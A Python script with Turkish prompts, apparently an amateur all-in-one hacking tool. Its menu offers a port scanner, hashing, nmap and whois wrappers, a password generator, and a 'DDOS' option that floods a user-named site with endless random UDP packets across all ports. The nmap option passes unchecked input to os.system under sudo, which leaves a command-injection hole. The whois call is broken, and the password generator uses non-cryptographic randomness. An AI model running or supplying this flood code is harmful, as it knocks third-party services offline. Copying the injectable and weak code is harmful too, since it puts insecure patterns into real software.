import socket
import hashlib
import os
from datetime import datetime
import time
import random
import string

print("""
-> THEFIERROS ALL İN ONE TOOL <-

1 - PORT SCANNER
2 - DDOS
3 - HASH MAKER
4 - NMAP (Linux Terminalde Geçerlidir. Nmap'ın Yüklü Olması Gereklidir)
5 - WHOIS (Linux Terminalde Geçerlidir. Whois'in Yüklü Olması Gereklidir)
6 - PASSWORD GENERATOR
""")

choice = input("Yapacağınız İşlem Numarasını Giriniz : ")

if choice == "1":
    target = input("Taramak İstediğiniz Site Adresini Giriniz -> ")
    port = int(input("Port Giriniz -> "))
    targetIP = socket.gethostbyname(target)
    print("-" * 60)
    print("Lütfen Bekleyin, Hedef Taranıyor -> ", targetIP)
    print("-" * 60)
    t1 = datetime.now()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((targetIP, port))
    if result == 0:
        print(f"Port {port} -> Açık")
        print("-" * 60)
        t2 = datetime.now()
        total = t2 - t1
        print("Tarama {} İçinde Tamamlandı".format(total))
        print("-" * 60)
        sock.close()
    else:
        print(f"{port} Portu Kapalı")
        print("-" * 60)
        t2 = datetime.now()
        total = t2 - t1
        print("Tarama {} İçinde Tamamlandı".format(total))
        print("-" * 60)
elif choice == "2":
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    site = input("Ddos atmak istediğiniz site adresini giriniz : ")
    ip = socket.gethostbyname(site)
    port = int(input("Port numarasını giriniz : "))
    print("Saldırı Başlıyor...")
    print("[                    ] 0%")
    time.sleep(2)
    print("[=====               ] 25%")
    time.sleep(2)
    print("[==========          ] 50%")
    time.sleep(2)
    print("[===============     ] 75%")
    time.sleep(2)
    print("[====================] 100%")
    time.sleep(1)
    t1 = datetime.now()
    sent = 0
    while True:
        sock.sendto(bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print(f"{site} hedefine {port} portundan {sent} paket gönderildi..")
        if port == 65534:
            port = 1
elif choice == "3":
    text = input("Şifrelenecek Metni Giriniz : ")
    enc_type = input("1 - MD5\n2- SHA256\nŞifreleme Türünü Giriniz :")
    if enc_type == "1":
        hash = hashlib.md5(text.encode("ascii"))
        hash = hash.hexdigest()
        print(f"Hash -> {hash}")
    elif enc_type == "2":
        hash = hashlib.sha256(text.encode("ascii"))
        hash = hash.hexdigest()
        print(f"Hash -> {hash}")  
    else:
        print("Hatalı Tuşlama..")
elif choice == "4":
    target = input("Website Adresi veya IP Adresi Giriniz : ")
    os.system("sudo nmap -sS -sV "+target)
elif choice == "5":
    target = input("Site Adresi Girin :")
    os.system("whois ",target)
elif choice == "6":
    lenght = int(input("Parola Uzunluğu : "))
    lower = string.ascii_lowercase
    upper = string.ascii_uppercase
    digit = string.digits
    punc = string.punctuation
    all = lower + upper + digit + punc
    password = ''.join(random.sample(all, lenght))
    print(password)
else:
    print("Hatalı İşlem Numarası..")